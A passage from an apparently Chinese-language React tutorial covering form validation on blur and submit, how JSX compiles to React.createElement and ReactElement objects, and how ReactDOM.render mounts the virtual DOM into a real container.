&#123;</span><br><span class="line">    onBlur (e) &#123;</span><br><span class="line">      <span class="keyword">const</span> rules = <span class="title class_">Rules</span>[e.<span class="property">target</span>.<span class="property">name</span>]</span><br><span class="line">      <span class="keyword">const</span> value = e.<span class="property">target</span>.<span class="property">value</span></span><br><span class="line">      <span class="comment">/* 失去焦点校验 */</span></span><br><span class="line">      <span class="keyword">const</span> verifyResult = <span class="title function_">verify</span>(value, rules)</span><br><span class="line">      <span class="keyword">if</span> (verifyResult.<span class="property">error</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(verifyResult.<span class="property">message</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  render () &#123;</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">input</span> &#123;<span class="attr">...this.validator</span>&#125; <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&#123;this.state.username&#125;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">onChange</span>=<span class="string">&#123;this.handleChange&#125;/</span>&gt;</span></span></span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">input</span> &#123;<span class="attr">...this.validator</span>&#125; <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&#123;this.state.password&#125;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">onChange</span>=<span class="string">&#123;this.handleChange&#125;/</span>&gt;</span></span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 校验规则</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title class_">Rules</span> = &#123;</span><br><span class="line">  <span class="attr">username</span>: [</span><br><span class="line">    &#123; <span class="attr">require</span>: <span class="literal">true</span>, <span class="attr">message</span>: <span class="string">&#x27;昵称不能为空&#x27;</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">min</span>: <span class="number">2</span>, <span class="attr">max</span>: <span class="number">20</span>, <span class="attr">message</span>: <span class="string">&#x27;昵称长度不能小于2位，并且不能超过20位&#x27;</span> &#125;,</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">password</span>: [</span><br><span class="line">    &#123; <span class="attr">require</span>: <span class="literal">true</span>, <span class="attr">message</span>: <span class="string">&#x27;密码不能为空&#x27;</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">regular</span>: <span class="regexp">/^\w*$/</span>, <span class="attr">message</span>: <span class="string">&#x27;密码格式不正确，只能输入字母、数字、下划线&#x27;</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">min</span>: <span class="number">6</span>, <span class="attr">max</span>: <span class="number">20</span>, <span class="attr">message</span>: <span class="string">&#x27;密码长度不能小于6位，并且不能超过20位&#x27;</span> &#125;,</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理校验规则</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">verify</span> (value, rules) &#123;</span><br><span class="line">  <span class="keyword">let</span> verifyResult = &#123; <span class="attr">error</span>: <span class="literal">true</span>, <span class="attr">message</span>: <span class="string">&#x27;填写必填项&#x27;</span> &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> rule <span class="keyword">of</span> rules) &#123;</span><br><span class="line">    <span class="comment">// 校验的几种方式：针对 require | regular | min | max 做了处理</span></span><br><span class="line">    <span class="keyword">const</span> errorVerify = (rule.<span class="property">require</span> &amp;&amp; value === <span class="string">&#x27;&#x27;</span>) ||</span><br><span class="line">                        (rule.<span class="property">regular</span> &amp;&amp; !rule.<span class="property">regular</span>.<span class="title function_">test</span>(value)) ||</span><br><span class="line">                        (rule.<span class="property">min</span> &amp;&amp; value.<span class="property">length</span> &lt; rule.<span class="property">min</span>) ||</span><br><span class="line">                        (rule.<span class="property">max</span> &amp;&amp; value.<span class="property">length</span> &gt; rule.<span class="property">max</span>)</span><br><span class="line">    <span class="comment">// 校验错误，则返回error及message，并跳出循环，不继续执行循环</span></span><br><span class="line">    <span class="keyword">if</span> (errorVerify) &#123;</span><br><span class="line">      verifyResult = &#123; <span class="attr">error</span>: <span class="literal">true</span>, <span class="attr">message</span>: rule.<span class="property">message</span> &#125;</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 校验成功，将 error 设置为 false</span></span><br><span class="line">    verifyResult = &#123; <span class="attr">error</span>: <span class="literal">false</span>, <span class="attr">message</span>: <span class="string">&#x27;&#x27;</span> &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> verifyResult</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />这里我们定义了 <code>validator</code> 对象，对象中有一个 <code>onBlur()</code> 函数， <code>onBlur()</code> 函数用来处理失去焦点的验证。在 <code>input</code> 中，加入了 <code>&#123;...this.validator&#125;</code> ，这样写是为了以后的扩展性（比如可以在 <code>validator</code> 中加入其他的处理函数），当然也等同于 <code>onBlur=&#123;onBlur&#125;</code> 。</p><p>在表单校验的主逻辑中，只获取了校验结果和提示内容，至于如何验证都交给了 <code>verify</code> 函数去处理，这样我们主逻辑代码就很清晰了。这里我们将校验规则与校验规则的处理放在了单独的文件中，这样主逻辑代码看起来更加简洁，在主逻辑代码中，我们只管使用相应的校验规则，而不用关心校验规则是如何进行的。</p><p><strong>（2）提交时校验</strong><br />如果只对单个输入框失去焦点时进行校验，并不能保证提交时都是正确的数据，所以还需要在点击提交时，再次校验规则。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 提交时校验</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Register</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="title function_">handleSubmit</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    e.<span class="title function_">preventDefault</span>();</span><br><span class="line">    <span class="comment">/* 提交校验 */</span></span><br><span class="line">    <span class="keyword">const</span> verifyResult = <span class="title function_">submitVerify</span>(<span class="variable language_">this</span>.<span class="property">state</span>);</span><br><span class="line">    <span class="keyword">if</span> (verifyResult.<span class="property">error</span>) &#123;</span><br><span class="line">      <span class="title function_">alert</span>(verifyResult.<span class="property">message</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">`昵称：<span class="subst">$&#123;<span class="variable language_">this</span>.state.username&#125;</span> 密码：<span class="subst">$&#123;<span class="variable language_">this</span>.state.password&#125;</span>`</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 校验规则</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title class_">Rules</span> = &#123;</span><br><span class="line">  <span class="attr">username</span>: [</span><br><span class="line">    &#123; <span class="attr">require</span>: <span class="literal">true</span>, <span class="attr">message</span>: <span class="string">&quot;昵称不能为空&quot;</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">min</span>: <span class="number">2</span>, <span class="attr">max</span>: <span class="number">20</span>, <span class="attr">message</span>: <span class="string">&quot;昵称长度不能小于2位，并且不能超过20位&quot;</span> &#125;,</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">password</span>: [</span><br><span class="line">    &#123; <span class="attr">require</span>: <span class="literal">true</span>, <span class="attr">message</span>: <span class="string">&quot;密码不能为空&quot;</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">regular</span>: <span class="regexp">/^\w*$/</span>, <span class="attr">message</span>: <span class="string">&quot;密码格式不正确，只能输入字母、数字、下划线&quot;</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">min</span>: <span class="number">6</span>, <span class="attr">max</span>: <span class="number">20</span>, <span class="attr">message</span>: <span class="string">&quot;密码长度不能小于6位，并且不能超过20位&quot;</span> &#125;,</span><br><span class="line">  ],</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理校验规则</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">submitVerify</span>(<span class="params">state</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> verifyResult = &#123;&#125;;</span><br><span class="line">  <span class="comment">/* 从Rules中取key值 */</span></span><br><span class="line">  <span class="keyword">const</span> keyArray = <span class="title class_">Object</span>.<span class="title function_">keys</span>(<span class="title class_">Rules</span>);</span><br><span class="line">  <span class="comment">/* 这里通过循环对 Rules 中的每个值进行了遍历，</span></span><br><span class="line"><span class="comment">   * 并在每次遍历的过程中，都使用 verify() 函数进行验证处理 */</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">of</span> keyArray) &#123;</span><br><span class="line">    <span class="keyword">const</span> rules = <span class="title class_">Rules</span>[key];</span><br><span class="line">    <span class="comment">/* 单次处理和我们在失去焦点时处理方式一样 */</span></span><br><span class="line">    verifyResult = <span class="title function_">verify</span>(state[key], rules);</span><br><span class="line">    <span class="comment">/* 如果发现填写的有错误项，直接退出循环 */</span></span><br><span class="line">    <span class="keyword">if</span> (verifyResult.<span class="property">error</span>) <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> verifyResult;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="i1pDY"></a></p><h2 id="六、JSX-是如何变成-DOM-的？"><a href="#六、JSX-是如何变成-DOM-的？" class="headerlink" title="六、JSX 是如何变成 DOM 的？"></a>六、JSX 是如何变成 DOM 的？<br /><br /></h2><p>React 官网中对 JSX 的定义：</p><blockquote><p>JSX 是 JavaScript 的一种语法扩展，它和模板语言很接近，但是它充分具备 JavaScript 的能力。</p></blockquote><p>那关键问题就是<strong>JSX 是如何在 JavaScript 中生效的</strong>，官方的解释：</p><blockquote><p>JSX 会被编译为 React.createElement()， React.createElement() 将返回一个叫作“React Element”的 JS 对象。</p></blockquote><p>实际上，JSX 仅仅只是 <code>**React.createElement(component, props, ...children)**</code>函数的语法糖。所有的 jsx 最终都会被转换成<code>React.createElement</code>的函数调用。这也就意味着，我们写的 JSX 其实写的就是 <code>React.createElement</code>，虽然它看起来很像 HTML。这也印证了 JSX 充分具备 JavaScript 的能力。</p><p><strong>React 内部处理 createElement 的源码如下：</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">createElement</span>(<span class="params">type, config, children</span>) &#123;</span><br><span class="line">  <span class="comment">// propName 变量用于储存后面需要用到的元素属性</span></span><br><span class="line">  <span class="keyword">let</span> propName;</span><br><span class="line">  <span class="comment">// props 变量用于储存元素属性的键值对集合</span></span><br><span class="line">  <span class="keyword">const</span> props = &#123;&#125;;</span><br><span class="line">  <span class="comment">// key、ref、self、source 均为 React 元素的属性</span></span><br><span class="line">  <span class="keyword">let</span> key = <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">let</span> ref = <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">let</span> self = <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">let</span> source = <span class="literal">null</span>;</span><br><span class="line">  <span class="comment">// config 对象中存储的是元素的属性</span></span><br><span class="line">  <span class="keyword">if</span> (config != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="comment">// 依次对 ref、key、self 和 source 属性赋值</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">hasValidRef</span>(config)) &#123;</span><br><span class="line">      ref = config.<span class="property">ref</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 此处将 key 值字符串化</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">hasValidKey</span>(config)) &#123;</span><br><span class="line">      key = <span class="string">&quot;&quot;</span> + config.<span class="property">key</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    self = config.<span class="property">__self</span> === <span class="literal">undefined</span> ? <span class="literal">null</span> : config.<span class="property">__self</span>;</span><br><span class="line">    source = config.<span class="property">__source</span> === <span class="literal">undefined</span> ? <span class="literal">null</span> : config.<span class="property">__source</span>;</span><br><span class="line">    <span class="comment">// 把 config 里面的属性都一个一个挪到 props 这个之前声明好的对象里面</span></span><br><span class="line">    <span class="keyword">for</span> (propName <span class="keyword">in</span> config) &#123;</span><br><span class="line">      <span class="keyword">if</span> (</span><br><span class="line">        <span class="comment">// 筛选出可以提进 props 对象里的属性</span></span><br><span class="line">        hasOwnProperty.<span class="title function_">call</span>(config, propName) &amp;&amp;</span><br><span class="line">        !<span class="variable constant_">RESERVED_PROPS</span>.<span class="title function_">hasOwnProperty</span>(propName)</span><br><span class="line">      ) &#123;</span><br><span class="line">        props[propName] = config[propName];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// childrenLength 指的是当前元素的子元素的个数，减去的 2 是 type 和 config 两个参数占用的长度</span></span><br><span class="line">  <span class="keyword">const</span> childrenLength = <span class="variable language_">arguments</span>.<span class="property">length</span> - <span class="number">2</span>;</span><br><span class="line">  <span class="comment">// 如果抛去type和config，就只剩下一个参数，一般意味着文本节点出现了</span></span><br><span class="line">  <span class="keyword">if</span> (childrenLength === <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// 直接把这个参数的值赋给props.children</span></span><br><span class="line">    props.<span class="property">children</span> = children;</span><br><span class="line">    <span class="comment">// 处理嵌套多个子元素的情况</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (childrenLength &gt; <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// 声明一个子元素数组</span></span><br><span class="line">    <span class="keyword">const</span> childArray = <span class="title class_">Array</span>(childrenLength);</span><br><span class="line">    <span class="comment">// 把子元素推进数组里</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; childrenLength; i++) &#123;</span><br><span class="line">      childArray[i] = <span class="variable language_">arguments</span>[i + <span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 最后把这个数组赋值给props.children</span></span><br><span class="line">    props.<span class="property">children</span> = childArray;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 处理 defaultProps</span></span><br><span class="line">  <span class="keyword">if</span> (type &amp;&amp; type.<span class="property">defaultProps</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> defaultProps = type.<span class="property">defaultProps</span>;</span><br><span class="line">    <span class="keyword">for</span> (propName <span class="keyword">in</span> defaultProps) &#123;</span><br><span class="line">      <span class="keyword">if</span> (props[propName] === <span class="literal">undefined</span>) &#123;</span><br><span class="line">        props[propName] = defaultProps[propName];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 最后返回一个调用ReactElement执行方法，并传入刚才处理过的参数</span></span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">ReactElement</span>(</span><br><span class="line">    type,</span><br><span class="line">    key,</span><br><span class="line">    ref,</span><br><span class="line">    self,</span><br><span class="line">    source,</span><br><span class="line">    <span class="title class_">ReactCurrentOwner</span>.<span class="property">current</span>,</span><br><span class="line">    props</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br /><strong>入参：createElement 需要传递三个参数：</strong><br />（1）参数一：<code>type</code>，表示当前 ReactElement 的类型； <br />● 如果是标签元素，那么就使用字符串表示 “div”； <br />● 如果是组件元素，那么就直接使用组件的名称；<br />（2）参数二：<code>config</code>，以对象形式传入，组件所有的属性都会以键值对的形式存储在 <code>config</code> 对象中；<br />（3）参数三：<code>children</code>，存放在标签中的内容，以<code>children</code>数组的方式进行存储；</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// jsx -&gt; babel -&gt; React.createElement()</span></span><br><span class="line"><span class="keyword">const</span> message1 = <span class="language-xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>Hello React<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span>;</span><br><span class="line"><span class="keyword">const</span> message2 = <span class="title class_">React</span>.<span class="title function_">createElement</span>(<span class="string">&quot;h2&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;Hello React&quot;</span>);</span><br></pre></td></tr></table></figure><p><br />createElement 的处理流程：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1500604/1606615633463-b90e82ab-5808-4ff5-a380-1963e5bcf70d.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1500604/1606615633463-b90e82ab-5808-4ff5-a380-1963e5bcf70d.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>简单来说，<code>React.createElement</code>就是一个“转换器”，将用户输入的参数，进行一定的格式化，最终通过调用<code>ReactElement</code>来实现元素的创建。</p><p><strong>出参：</strong><code>createElement</code> 执行到最后会 return 一个针对 ReactElement 的调用。下面是 ReactElement 的源码：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">ReactElement</span> = <span class="keyword">function</span> (<span class="params">type, key, ref, self, source, owner, props</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> element = &#123;</span><br><span class="line">    <span class="comment">// REACT_ELEMENT_TYPE是一个常量，用来标识该对象是一个ReactElement</span></span><br><span class="line">    <span class="attr">$$typeof</span>: <span class="variable constant_">REACT_ELEMENT_TYPE</span>,</span><br><span class="line">    <span class="comment">// 内置属性赋值</span></span><br><span class="line">    <span class="attr">type</span>: type,</span><br><span class="line">    <span class="attr">key</span>: key,</span><br><span class="line">    <span class="attr">ref</span>: ref,</span><br><span class="line">    <span class="attr">props</span>: props,</span><br><span class="line">    <span class="comment">// 记录创造该元素的组件</span></span><br><span class="line">    <span class="attr">_owner</span>: owner,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="keyword">if</span> (__DEV__) &#123;</span><br><span class="line">    <span class="comment">//__DEV__ 环境下的处理</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> element;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><br />根据上面的源码可以看出，ReactElement 实际上就做了一件事，将传入的参数进行组装，将它们组装进<code>element</code>对象中，并将它返回给了<code>React.createElement</code>，最终 <code>React.createElement</code> 又把它交回到了开发者手中。</p><p>整体的流程图如下：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1500604/1606616745052-f1dececb-9d41-4022-bb0a-cece68c72494.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1500604/1606616745052-f1dececb-9d41-4022-bb0a-cece68c72494.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>通过 <code>React.createElement</code> 最终创建出来一个<code>ReactElement</code>对象。</p><p>React 利用 ReactElement 对象组成了一个 JavaScript 的对象树，对象树就是虚拟 DOM（Virtual DOM）。下面是一个 ReactElement 对象的示例代码：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">// jsx -&gt; createElement函数 -&gt; ReactElement(对象树) -&gt; ReactDOM.render -&gt; 真实DOM</span></span><br><span class="line">        <span class="comment">// jsx -&gt; createElement函数 -&gt; ReactElement(对象树) -&gt; ReactDOM.render -&gt; 原生的控件(UIButton/Button)</span></span><br><span class="line">        <span class="keyword">var</span> elementObj = (</span><br><span class="line">          <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;header&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">              <span class="tag">&lt;<span class="name">h1</span> <span class="attr">title</span>=<span class="string">&quot;标题&quot;</span>&gt;</span>标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">              <span class="tag">&lt;<span class="name">h2</span>&gt;</span>内容<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">              <span class="tag">&lt;<span class="name">button</span>&gt;</span>按钮<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">              <span class="tag">&lt;<span class="name">button</span>&gt;</span>+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">              <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.baidu.com&quot;</span>&gt;</span>百度一下<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;footer&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">              <span class="tag">&lt;<span class="name">p</span>&gt;</span>底部<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">        )</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(elementObj);</span><br><span class="line">        <span class="keyword">return</span> elementObj;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1500604/1605540630415-5ee4ffa5-9aa0-4cbe-8cd8-92b104ade275.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1500604/1605540630415-5ee4ffa5-9aa0-4cbe-8cd8-92b104ade275.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>上面就是生成的对象树，也就是虚拟 DOM，那虚拟 DOM 是如何转化为真实的 DOM 结构的呢?它靠的就是<code>render</code>函数。在每一个 React 项目的入口文件中，都少不了对 <code>React.render</code> 函数的调用。</p><p><strong>ReactDOM.render 方法的入参规则：</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">ReactDOM</span>.<span class="title function_">render</span>(</span><br><span class="line">  <span class="comment">// 需要渲染的元素（ReactElement）</span></span><br><span class="line">  element,</span><br><span class="line">  <span class="comment">// 元素挂载的目标容器（一个真实DOM）</span></span><br><span class="line">  container,</span><br><span class="line">  <span class="comment">// 回调函数，可选参数，可以用来处理渲染结束后的逻辑</span></span><br><span class="line">  [callback]</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><br />ReactDOM.render 方法可以接收 3 个参数，其中<strong>第二个参数就是一个真实的 DOM 节点</strong>，<strong>这个真实的 DOM 节点充当“容器”的角色</strong>，React 元素最终会被渲染到这个“容器”里面去。上面所说的 App 组件，它对应的 render 调用是这样的：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">ReactDOM</span>.<span class="title function_">render</span>(<span class="language-xml"><span class="tag">&lt;<span class="name">App</span> /&gt;</span></span>, <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;app&quot;</span>));</span><br></pre></td></tr></table></figure><p><br />需要注意的是，这个真实的 DOM 一定是确实存在的，比如在 App 组件对应的 index.html 中，已经提前预置 了 id 为 root 的根节点：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure><p><br /><strong>那为什么要操作虚拟 DOM，而不是操作真实的 DOM 呢？</strong><br />原因如下：<br />● 很难跟踪状态发生的改变：原有的开发模式，我们很难跟踪到状态发生的改变，不方便针对我们应用程序进行调试； <br />● 操作真实 DOM 性能较低：传统的开发模式会进行频繁的 DOM 操作，而这一的做法性能非常的低；</p><p><strong>DOM 操作性能非常低：</strong><br />● 首先，<code>document.createElement</code>本身创建出来的就是一个非常复杂的对象；<br />● 其次，DOM 操作会引起浏览器的<code>回流和重绘</code>，所以在开发中应该避免频繁的 DOM 操作；</p><p>虚拟 DOM 